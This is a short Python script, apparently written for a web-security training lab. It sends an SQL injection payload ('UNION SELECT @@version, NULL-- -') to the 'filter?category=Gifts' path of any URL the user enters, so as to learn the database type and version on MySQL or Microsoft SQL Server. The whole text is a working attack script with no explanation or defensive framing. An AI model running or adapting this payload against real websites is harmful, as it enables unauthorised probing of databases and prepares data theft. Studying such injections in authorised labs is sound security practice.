#SQL injection attack, querying the database type and version on MySQL and Microsoft
import requests
url = input("enter url : ")
path="filter?category=Gifts"
payload="'+UNION+SELECT+@@version,+NULL-- -"
r=requests.get(url+path+payload)


